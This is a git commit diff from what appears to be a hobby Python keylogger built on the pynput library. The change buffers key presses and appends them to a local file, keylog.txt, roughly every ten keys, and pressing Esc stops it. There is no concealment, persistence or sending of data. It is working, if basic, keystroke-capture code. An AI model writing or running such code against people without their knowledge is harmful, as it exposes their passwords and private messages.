7ec8d342d0c9896db7d17f8ce9900df82ab0a792
Sameer Khichi <sameerrkhichi@gmail.com>
2025-01-02 22:07:53 -0500

    adding functionality to save keystrokes to a file after 10 characters

--- keylogger.py
+++ keylogger.py
@@ -1,16 +1,35 @@
 import pynput
 from pynput.keyboard import Key, Listener
 
+#global variables 
+counter = 0
+keystrokes = []
+
+#when a key is pressed, add one to the counter and add it to the array
 def on_press(key):
+    global keystrokes
+    global counter
+    keystrokes.append(key)
 
-    print(key)
+    if counter == 10:
+        counter = 0
+        log_keystrokes(keystrokes)
+        keystrokes = []
+    else:
+        counter += 1
 
-
+#if the esc key is pressed, quit the program (break the loop)
 def on_release(key):
     
     if key == Key.esc:
         return False
 
+#write every ten characters to a text file
+def log_keystrokes(keystrokes):
+    with open("keylog.txt", "a") as file:
+
+        for key in keystrokes:
+            file.write(str(key))
 
 #this listener is a loop that will constantly run until it is broken out of
 #on_press is a function called when a key is pressed
